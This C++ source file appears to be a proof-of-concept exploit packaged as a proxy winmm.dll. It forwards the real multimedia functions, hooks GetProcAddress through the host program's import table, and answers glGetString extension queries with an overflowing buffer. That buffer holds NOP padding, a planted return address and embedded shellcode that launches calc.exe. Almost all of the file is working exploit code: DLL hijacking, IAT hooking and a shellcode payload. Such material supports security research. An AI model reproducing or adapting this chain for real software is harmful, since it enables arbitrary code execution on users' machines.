#include <cstring>

#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#include <mmsystem.h>

#include "utils.h"

using JoyGetNumDevsFn = ::UINT(WINAPI *)();
using JoyGetPosExFn = ::MMRESULT(WINAPI *)(::UINT, ::LPJOYINFOEX);
using JoyGetDevCapsAFn = ::MMRESULT(WINAPI *)(::UINT_PTR, ::LPJOYCAPSA, ::UINT);
using MidiInStartFn = ::MMRESULT(WINAPI *)(::HMIDIIN);
using MidiInOpenFn = ::MMRESULT(WINAPI *)(::LPHMIDIIN, ::UINT, ::DWORD_PTR, ::DWORD_PTR, ::DWORD);
using MidiInGetNumDevsFn = ::UINT(WINAPI *)();
using MidiInCloseFn = ::MMRESULT(WINAPI *)(::HMIDIIN);
using MidiInGetDevCapsAFn = ::MMRESULT(WINAPI *)(::UINT_PTR, ::LPMIDIINCAPSA, ::UINT);
using TimeGetTimeFn = ::DWORD(WINAPI *)();
using TimeBeginPeriodFn = ::MMRESULT(WINAPI *)(::UINT);
using TimeEndPeriodFn = ::MMRESULT(WINAPI *)(::UINT);

using glGetString_t = const unsigned char *(WINAPI *)(unsigned int name);
using GetProcAddress_t = FARPROC(WINAPI *)(HMODULE, LPCSTR);

namespace
{

glGetString_t Original_glGetString = nullptr;
GetProcAddress_t Original_GetProcAddress = nullptr;

[[maybe_unused]] auto patch() -> void
{
    static auto *patch_addr = reinterpret_cast<void *>(0x0044793a);
    const auto auto_prot = richterite::AutoProtect{reinterpret_cast<void *>(patch_addr), 6, PAGE_EXECUTE_READWRITE};

    std::memset(patch_addr, 0x90, 6);

    richterite::log("patch applied at {}", patch_addr);
}
}

extern "C"
{

__declspec(dllexport) ::UINT WINAPI joyGetNumDevs(void)
{
    static const auto orig_func = []
    {
        const auto lib = ::LoadLibraryA("C:\\Windows\\System32\\winmm.dll");
        return reinterpret_cast<JoyGetNumDevsFn>(::GetProcAddress(lib, "joyGetNumDevs"));
    }();

    return orig_func();
}

__declspec(dllexport) ::MMRESULT WINAPI joyGetPosEx(::UINT uJoyID, ::LPJOYINFOEX pji)
{
    static const auto orig_func = []
    {
        const auto lib = ::LoadLibraryA("C:\\Windows\\System32\\winmm.dll");
        return reinterpret_cast<JoyGetPosExFn>(::GetProcAddress(lib, "joyGetPosEx"));
    }();

    return orig_func(uJoyID, pji);
}

__declspec(dllexport) ::MMRESULT WINAPI joyGetDevCapsA(::UINT_PTR uJoyID, ::LPJOYCAPSA pjc, ::UINT cbjc)
{
    static const auto orig_func = []
    {
        const auto lib = ::LoadLibraryA("C:\\Windows\\System32\\winmm.dll");
        return reinterpret_cast<JoyGetDevCapsAFn>(::GetProcAddress(lib, "joyGetDevCapsA"));
    }();

    return orig_func(uJoyID, pjc, cbjc);
}

__declspec(dllexport) ::MMRESULT WINAPI midiInStart(::HMIDIIN hMidiIn)
{
    static const auto orig_func = []
    {
        const auto lib = ::LoadLibraryA("C:\\Windows\\System32\\winmm.dll");
        return reinterpret_cast<MidiInStartFn>(::GetProcAddress(lib, "midiInStart"));
    }();

    return orig_func(hMidiIn);
}

__declspec(dllexport) ::MMRESULT WINAPI
midiInOpen(::LPHMIDIIN phMidiIn, ::UINT uDeviceID, ::DWORD_PTR dwCallback, ::DWORD_PTR dwInstance, ::DWORD dwFlags)
{
    static const auto orig_func = []
    {
        const auto lib = ::LoadLibraryA("C:\\Windows\\System32\\winmm.dll");
        return reinterpret_cast<MidiInOpenFn>(::GetProcAddress(lib, "midiInOpen"));
    }();

    return orig_func(phMidiIn, uDeviceID, dwCallback, dwInstance, dwFlags);
}

__declspec(dllexport) ::UINT WINAPI midiInGetNumDevs(void)
{
    static const auto orig_func = []
    {
        const auto lib = ::LoadLibraryA("C:\\Windows\\System32\\winmm.dll");
        return reinterpret_cast<MidiInGetNumDevsFn>(::GetProcAddress(lib, "midiInGetNumDevs"));
    }();

    return orig_func();
}

__declspec(dllexport) ::MMRESULT WINAPI midiInClose(::HMIDIIN hMidiIn)
{
    static const auto orig_func = []
    {
        const auto lib = ::LoadLibraryA("C:\\Windows\\System32\\winmm.dll");
        return reinterpret_cast<MidiInCloseFn>(::GetProcAddress(lib, "midiInClose"));
    }();

    return orig_func(hMidiIn);
}

__declspec(dllexport) ::MMRESULT WINAPI midiInGetDevCapsA(::UINT_PTR uDeviceID, ::LPMIDIINCAPSA pmic, ::UINT cbmic)
{
    static const auto orig_func = []
    {
        const auto lib = ::LoadLibraryA("C:\\Windows\\System32\\winmm.dll");
        return reinterpret_cast<MidiInGetDevCapsAFn>(::GetProcAddress(lib, "midiInGetDevCapsA"));
    }();

    return orig_func(uDeviceID, pmic, cbmic);
}

__declspec(dllexport) ::DWORD WINAPI timeGetTime(void)
{
    static const auto *glString_addr = reinterpret_cast<std::uintptr_t *>(0x011733f0);
    richterite::log("timeGetTime {:x}", *glString_addr);

    static const auto orig_func = []
    {
        const auto lib = ::LoadLibraryA("C:\\Windows\\System32\\winmm.dll");
        return reinterpret_cast<TimeGetTimeFn>(::GetProcAddress(lib, "timeGetTime"));
    }();

    static auto once = false;
    if (!once)
    {
        static const auto *glString_addr = reinterpret_cast<std::uintptr_t *>(0x011733f0);
        if (*glString_addr)
        {
            richterite::log("can hook glString");
            once = true;
        }
    }

    return orig_func();
}

__declspec(dllexport) ::MMRESULT WINAPI timeBeginPeriod(::UINT uPeriod)
{
    static const auto *glString_addr = reinterpret_cast<std::uintptr_t *>(0x011733f0);
    richterite::log("timeBeginPeriod {:x}", *glString_addr);

    static const auto orig_func = []
    {
        const auto lib = ::LoadLibraryA("C:\\Windows\\System32\\winmm.dll");
        return reinterpret_cast<TimeBeginPeriodFn>(::GetProcAddress(lib, "timeBeginPeriod"));
    }();

    return orig_func(uPeriod);
}

__declspec(dllexport) ::MMRESULT WINAPI timeEndPeriod(::UINT uPeriod)
{
    static const auto orig_func = []
    {
        const auto lib = ::LoadLibraryA("C:\\Windows\\System32\\winmm.dll");
        return reinterpret_cast<TimeEndPeriodFn>(::GetProcAddress(lib, "timeEndPeriod"));
    }();

    return orig_func(uPeriod);
}

__declspec(dllexport) const unsigned char *WINAPI Hooked_glGetString(unsigned int name)
{
    richterite::log("hooked glGetString called");
    if (name != 0x1F03)
    {
        return Original_glGetString(name);
    }

    static char custom_ext_buffer[0x1000] = {0};
    std::memset(custom_ext_buffer, 0x90, sizeof(custom_ext_buffer) - 1);

    auto ret_addr = reinterpret_cast<std::uintptr_t>(custom_ext_buffer + 0x100);
    std::memcpy(custom_ext_buffer + 4081, &ret_addr, sizeof(ret_addr));

    // rando shellcode from the internet
    // https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html
    unsigned char shellcode[] = "\x50\x53\x51\x52\x56\x57\x55\x89"
                                "\xe5\x83\xec\x18\x31\xf6\x56\x6a"
                                "\x63\x66\x68\x78\x65\x68\x57\x69"
                                "\x6e\x45\x89\x65\xfc\x31\xf6\x64"
                                "\x8b\x5e\x30\x8b\x5b\x0c\x8b\x5b"
                                "\x14\x8b\x1b\x8b\x1b\x8b\x5b\x10"
                                "\x89\x5d\xf8\x31\xc0\x8b\x43\x3c"
                                "\x01\xd8\x8b\x40\x78\x01\xd8\x8b"
                                "\x48\x24\x01\xd9\x89\x4d\xf4\x8b"
                                "\x78\x20\x01\xdf\x89\x7d\xf0\x8b"
                                "\x50\x1c\x01\xda\x89\x55\xec\x8b"
                                "\x58\x14\x31\xc0\x8b\x55\xf8\x8b"
                                "\x7d\xf0\x8b\x75\xfc\x31\xc9\xfc"
                                "\x8b\x3c\x87\x01\xd7\x66\x83\xc1"
                                "\x08\xf3\xa6\x74\x0a\x40\x39\xd8"
                                "\x72\xe5\x83\xc4\x26\xeb\x41\x8b"
                                "\x4d\xf4\x89\xd3\x8b\x55\xec\x66"
                                "\x8b\x04\x41\x8b\x04\x82\x01\xd8"
                                "\x31\xd2\x52\x68\x2e\x65\x78\x65"
                                "\x68\x63\x61\x6c\x63\x68\x6d\x33"
                                "\x32\x5c\x68\x79\x73\x74\x65\x68"
                                "\x77\x73\x5c\x53\x68\x69\x6e\x64"
                                "\x6f\x68\x43\x3a\x5c\x57\x89\xe6"
                                "\x6a\x0a\x56\xff\xd0\x83\xc4\x46"
                                "\x5d\x5f\x5e\x5a\x59\x5b\x58\xc3";
    std::memcpy(custom_ext_buffer + 0x108, shellcode, sizeof(shellcode) - 1);

    richterite::log("returning fake glGetString extensions");

    return (const unsigned char *)custom_ext_buffer;
}

FARPROC WINAPI Hooked_GetProcAddress(HMODULE hModule, LPCSTR lpProcName)
{
    if (HIWORD(lpProcName) != 0)
    {
        if (::lstrcmpA(lpProcName, "glGetString") == 0)
        {
            richterite::log("hooked glGetString");
            Original_glGetString = reinterpret_cast<glGetString_t>(Original_GetProcAddress(hModule, lpProcName));
            return (FARPROC)&Hooked_glGetString;
        }
    }

    return Original_GetProcAddress(hModule, lpProcName);
}

// cobbled this together - ok for PoC
void hook_iat()
{
    auto const h_exe = ::GetModuleHandleA(nullptr);
    if (!h_exe)
    {
        return;
    }

    auto const dos_header = reinterpret_cast<::PIMAGE_DOS_HEADER>(h_exe);
    auto const nt_headers =
        reinterpret_cast<::PIMAGE_NT_HEADERS>(reinterpret_cast<::BYTE *>(h_exe) + dos_header->e_lfanew);

    auto const &import_dir = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (import_dir.Size == 0)
    {
        return;
    }

    auto const import_desc =
        reinterpret_cast<::PIMAGE_IMPORT_DESCRIPTOR>(reinterpret_cast<::BYTE *>(h_exe) + import_dir.VirtualAddress);

    for (auto desc = import_desc; desc->Name != 0; ++desc)
    {
        auto const module_name = reinterpret_cast<::LPCSTR>(reinterpret_cast<::BYTE *>(h_exe) + desc->Name);

        if (::lstrcmpiA(module_name, "KERNEL32.dll") == 0)
        {
            auto const orig_first_thunk =
                reinterpret_cast<::PIMAGE_THUNK_DATA>(reinterpret_cast<::BYTE *>(h_exe) + desc->OriginalFirstThunk);
            auto const first_thunk =
                reinterpret_cast<::PIMAGE_THUNK_DATA>(reinterpret_cast<::BYTE *>(h_exe) + desc->FirstThunk);

            for (auto oft = orig_first_thunk, ft = first_thunk; oft->u1.AddressOfData != 0; ++oft, ++ft)
            {
                if (!(oft->u1.Ordinal & IMAGE_ORDINAL_FLAG))
                {
                    auto const import_by_name = reinterpret_cast<::PIMAGE_IMPORT_BY_NAME>(
                        reinterpret_cast<::BYTE *>(h_exe) + oft->u1.AddressOfData);

                    if (::lstrcmpA(reinterpret_cast<::LPCSTR>(import_by_name->Name), "GetProcAddress") == 0)
                    {
                        Original_GetProcAddress = reinterpret_cast<GetProcAddress_t>(ft->u1.Function);

                        auto old_protect = ::DWORD{};
                        ::VirtualProtect(&ft->u1.Function, sizeof(::DWORD_PTR), PAGE_READWRITE, &old_protect);

                        ft->u1.Function = reinterpret_cast<::DWORD_PTR>(&Hooked_GetProcAddress);

                        ::VirtualProtect(&ft->u1.Function, sizeof(::DWORD_PTR), old_protect, &old_protect);

                        return;
                    }
                }
            }
        }
    }
}

::DWORD WINAPI DllMain(::HINSTANCE, ::DWORD fdwReason, ::LPVOID)
{
    if (fdwReason == DLL_PROCESS_ATTACH)
    {
        richterite::log("winmm.dll loaded");
        hook_iat();

        // patch();
    }

    return 1;
}
}
